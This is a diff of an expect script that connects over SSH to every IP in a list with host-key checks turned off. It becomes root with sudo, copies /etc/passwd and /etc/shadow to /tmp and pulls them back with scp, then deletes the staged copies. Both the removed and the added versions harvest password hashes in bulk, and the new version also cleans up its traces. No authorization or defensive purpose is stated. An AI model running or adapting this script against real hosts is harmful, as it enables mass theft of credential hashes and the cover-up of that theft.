@@ -1,43 +1,44 @@
 #!/usr/bin/expect -f
 
-set timeout 10
-set ip_list "ips.txt"  ;# File containing list of IPs
-set rsa_key "~/.ssh/id_rsa" ;# Path to your RSA private key
-set local_dir "~/Desktop/" ;# Directory to save the files
+# Set variables
+set ip_list "ip_list.txt"
+set ssh_key "~/.ssh/id_rsa"
+set local_dir "~/Desktop"
 
-# Open the file containing IPs
+# Open the file containing IP addresses
 set fp [open $ip_list r]
-while {[gets $fp ip] != -1} {
-    spawn ssh -i $rsa_key -o StrictHostKeyChecking=no root@$ip
-
-    expect {
-        "No route to host" {
-            puts "Skipping $ip: No route to host"
-            continue
-        }
-        "Connection refused" {
-            puts "Skipping $ip: Connection refused"
-            continue
-        }
-        "Permission denied" {
-            puts "Skipping $ip: Permission denied"
-            continue
-        }
-        "root@" {
-            send "hostname\n"
-            expect -re "(.*)\n"
-            set hostname $expect_out(1,string)
-            send "scp -i $rsa_key /etc/passwd /etc/shadow root@$(hostname):/tmp/\n"
-            expect "root@"
-            send "exit\n"
-        }
-    }
-
-    spawn scp -i $rsa_key root@$ip:/etc/passwd $local_dir/${hostname}_passwd
-    expect "Permission denied" { puts "Skipping $ip: Cannot retrieve /etc/passwd" }
-
-    spawn scp -i $rsa_key root@$ip:/etc/shadow $local_dir/${hostname}_shadow
-    expect "Permission denied" { puts "Skipping $ip: Cannot retrieve /etc/shadow" }
-}
-
+set ip_addrs [split [read $fp] "\n"]
 close $fp
+
+# Iterate through each IP
+foreach ip $ip_addrs {
+    if {$ip eq ""} { continue }
+    
+    spawn ssh -i $ssh_key -o StrictHostKeyChecking=no user@$ip
+    expect "$ "
+    send "sudo -i\r"
+    expect "# "
+    
+    # Get hostname
+    send "hostname\r"
+    expect "# "
+    set hostname $expect_out(buffer)
+    set hostname [string trim $hostname]
+    
+    # Copy passwd
+    send "cp /etc/passwd /tmp/${hostname}_passwd\r"
+    expect "# "
+    send "cp /etc/shadow /tmp/${hostname}_shadow\r"
+    expect "# "
+    
+    # SCP files to local machine
+    spawn scp -i $ssh_key -o StrictHostKeyChecking=no user@$ip:/tmp/${hostname}_* $local_dir/
+    expect "$ "
+    
+    # Clean up
+    spawn ssh -i $ssh_key -o StrictHostKeyChecking=no user@$ip "rm -f /tmp/${hostname}_passwd /tmp/${hostname}_shadow"
+    expect "$ "
+    
+    send "exit\r"
+    expect eof
+}
